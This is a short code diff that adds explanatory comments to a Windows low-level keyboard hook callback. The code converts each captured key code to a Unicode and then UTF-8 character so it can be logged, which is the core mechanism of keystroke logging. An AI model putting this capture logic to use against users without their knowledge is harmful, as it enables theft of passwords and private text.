@@ -308,14 +308,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 			else
 			{
 
+				// if the key is not a special key, log it as a character
 				BYTE keyboardState[256];
 				GetKeyboardState(keyboardState);
 
+				// COnvert the virtual key code to a character
 				WCHAR unicodeBuffer[5];
 				int result = ToUnicode(keyCode, keyboardHookPtr->scanCode, keyboardState, unicodeBuffer, 4, 0);
 
 				if (result > 0)
 				{
+					// Convert the wide character to UTF-8
 					unicodeBuffer[result] = L'\0';
 					char utf8Buffer[16];
 					int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
